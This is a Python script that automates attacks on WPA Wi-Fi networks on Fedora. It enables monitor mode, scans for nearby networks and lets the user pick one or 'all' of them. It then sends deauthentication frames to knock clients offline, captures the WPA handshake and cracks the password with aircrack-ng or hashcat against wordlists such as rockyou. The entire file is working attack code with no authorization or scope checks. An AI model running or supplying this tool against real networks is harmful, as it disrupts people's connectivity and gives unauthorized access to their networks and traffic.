import os
import re
import time
import json
import signal
import sys
import subprocess
from threading import Thread
from collections import defaultdict

class FedoraWifiPenetrationTool:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.check_dependencies()
        self.running = True
        self.scan_results = []
        self.handshake_dir = "handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        
        # Register clean exit handler
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle graceful exit"""
        print("\nTerminating processes...")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def check_dependencies(self):
        """Verify and install required packages"""
        deps = {
            'aircrack-ng': ['aircrack-ng'],
            'iw': ['iw'],
            'wireless-tools': ['wireless-tools'],
            'hcxtools': ['hcxdumptool', 'hcxpcaptool'],
            'pyrit': ['pyrit'],
            'hashcat': ['hashcat']
        }
        
        missing = []
        for pkg, tools in deps.items():
            for tool in tools:
                if not self._check_tool(tool):
                    missing.append(pkg)
                    break
        
        if missing:
            print(f"Missing packages: {', '.join(missing)}")
            if input("Install missing packages? [y/N]: ").lower() == 'y':
                subprocess.run(["sudo", "dnf", "install", "-y"] + missing, check=True)

    def _check_tool(self, tool):
        """Check if a tool is available"""
        return subprocess.run(["which", tool], stdout=subprocess.PIPE).returncode == 0

    def start_monitor_mode(self):
        """Enable monitor mode with proper cleanup"""
        print(f"[*] Configuring {self.interface} in monitor mode...")
        
        try:
            # Stop interfering services
            subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
            subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"], check=True)
            
            # Set monitor mode
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"], check=True)
            subprocess.run(["sudo", "iw", "dev", self.interface, "set", "type", "monitor"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"], check=True)
            
            # Verify
            result = subprocess.run(["iw", self.interface, "info"], capture_output=True, text=True)
            return "type monitor" in result.stdout.lower()
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Error setting monitor mode: {e}")
            return False

    def channel_hopper(self):
        """Continuous channel hopping thread"""
        channels = [1, 6, 11] + list(range(2,6)) + list(range(7,11)) + list(range(12,14))
        while self.running:
            for channel in channels:
                if not self.running:
                    break
                subprocess.run(["sudo", "iw", "dev", self.interface, "set", "channel", str(channel)])
                time.sleep(0.5)

    def scan_networks(self, duration=10):
        """Scan for networks with Wifite-like display"""
        print("[*] Scanning for networks. Press Ctrl+C to stop...")
        
        # Start channel hopper
        hopper = Thread(target=self.channel_hopper)
        hopper.daemon = True
        hopper.start()
        
        # Start airodump-ng
        csv_file = "scan_results.csv"
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", self.interface, "-w", "scan", "--output-format", "csv"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        # Monitor scan
        start_time = time.time()
        while time.time() - start_time < duration and self.running:
            time.sleep(1)
            self._parse_scan_results("scan-01.csv")
            self._display_networks()
        
        proc.terminate()
        hopper.join(timeout=1)
        return self.scan_results

    def _parse_scan_results(self, filename):
        """Parse airodump-ng CSV output"""
        try:
            with open(filename) as f:
                content = f.read()
            
            # Split into AP and client sections
            sections = content.split('\r\n\r\n')
            ap_section = sections[0].split('\r\n')[1:] if len(sections) > 0 else []
            
            self.scan_results = []
            for line in ap_section:
                if not line.strip():
                    continue
                
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 14:
                    continue
                
                bssid = parts[0]
                channel = parts[3]
                speed = parts[4]
                encryption = parts[5]
                ssid = parts[13]
                
                self.scan_results.append({
                    'bssid': bssid,
                    'channel': channel,
                    'speed': speed,
                    'encryption': encryption,
                    'ssid': ssid,
                    'clients': []
                })
                
        except FileNotFoundError:
            pass

    def _display_networks(self):
        """Wifite-like network display"""
        os.system('clear')
        print(f"{'NUM':<4} {'BSSID':<18} {'CH':>3} {'PWR':>4} {'ENC':<8} {'ESSID'}")
        print("-" * 60)
        
        for i, net in enumerate(self.scan_results, 1):
            print(f"{i:<4} {net['bssid']:<18} {net['channel']:>3} {net['speed']:>4} "
                  f"{net['encryption']:<8} {net['ssid']}")

    def attack_network(self, target_index):
        """Perform WPA handshake capture with Wifite-like flow"""
        if not 0 <= target_index < len(self.scan_results):
            print("[!] Invalid network selection")
            return False
        
        target = self.scan_results[target_index]
        print(f"\n[*] Targeting: {target['ssid']} ({target['bssid']})")
        
        # Start capture
        cap_file = os.path.join(self.handshake_dir, re.sub(r'[^a-zA-Z0-9]', '_', target['ssid']))
        dump_proc = subprocess.Popen([
            "sudo", "airodump-ng",
            "-c", target['channel'],
            "--bssid", target['bssid'],
            "-w", cap_file,
            self.interface
        ])
        
        # Start deauth attack
        deauth_proc = subprocess.Popen([
            "sudo", "aireplay-ng",
            "--deauth", "5",
            "-a", target['bssid'],
            self.interface
        ])
        
        # Monitor for handshake
        print("[*] Waiting for handshake... (Ctrl+C to stop)")
        start_time = time.time()
        while self.running and (time.time() - start_time < 120):
            if self._check_handshake(f"{cap_file}-01.cap"):
                print("\n[+] Handshake captured!")
                dump_proc.terminate()
                deauth_proc.terminate()
                return True
            time.sleep(5)
        
        print("\n[!] Failed to capture handshake")
        dump_proc.terminate()
        deauth_proc.terminate()
        return False

    def _check_handshake(self, cap_file):
        """Check if capture contains handshake"""
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True
            )
            return "WPA (1 handshake)" in result.stdout
        except:
            return False

    def crack_handshake(self, cap_file, wordlist=None):
        """Multi-tool cracking approach"""
        if not wordlist:
            wordlist = self._select_wordlist()
        
        print(f"\n[*] Cracking with {wordlist}")
        
        # Try aircrack first
        if self._check_tool('aircrack-ng'):
            print("[*] Trying aircrack-ng...")
            result = subprocess.run([
                "sudo", "aircrack-ng",
                cap_file,
                "-w", wordlist
            ], capture_output=True, text=True)
            
            if "KEY FOUND" in result.stdout:
                key = re.search(r"KEY FOUND! \[(.*?)\]", result.stdout)
                print(f"\n[+] Success! Password: {key.group(1)}")
                return True
        
        # Fallback to hashcat
        if self._check_tool('hashcat'):
            print("[*] Trying hashcat...")
            hccapx_file = cap_file.replace('.cap', '.hccapx')
            subprocess.run([
                "cap2hccapx",
                cap_file,
                hccapx_file
            ], check=True)
            
            result = subprocess.run([
                "hashcat",
                "-m", "2500",
                hccapx_file,
                wordlist
            ], capture_output=True, text=True)
            
            if "Cracked" in result.stdout:
                print("\n[+] Hashcat cracked the password!")
                return True
        
        print("\n[!] Failed to crack handshake")
        return False

    def _select_wordlist(self):
        """Find available wordlists"""
        common_paths = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/john/password.lst",
            "/usr/share/dict/words"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return input("Enter path to wordlist: ")

    def interactive_mode(self):
        """Wifite-like interactive mode"""
        try:
            if not self.start_monitor_mode():
                return
            
            networks = self.scan_networks(duration=15)
            if not networks:
                print("[!] No networks found")
                return
            
            selection = input("\nSelect target number (1-%d) or 'all': " % len(networks))
            if selection.lower() == 'all':
                for i in range(len(networks)):
                    if self.attack_network(i):
                        cap_file = f"handshakes/{networks[i]['ssid']}-01.cap"
                        self.crack_handshake(cap_file)
            elif selection.isdigit() and 1 <= int(selection) <= len(networks):
                if self.attack_network(int(selection)-1):
                    cap_file = f"handshakes/{networks[int(selection)-1]['ssid']}-01.cap"
                    self.crack_handshake(cap_file)
            else:
                print("[!] Invalid selection")
                
        except KeyboardInterrupt:
            print("\n[*] Scan interrupted")
        finally:
            self.cleanup()

    def cleanup(self):
        """Restore system state"""
        print("[*] Cleaning up...")
        subprocess.run(["sudo", "pkill", "airodump-ng"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "aireplay-ng"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "down"])
        subprocess.run(["sudo", "iw", "dev", self.interface, "set", "type", "managed"])
        subprocess.run(["sudo", "ip", "link", "set", self.interface, "up"])
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"])
        subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant"])

if __name__ == "__main__":
    tool = FedoraWifiPenetrationTool()
    tool.interactive_mode()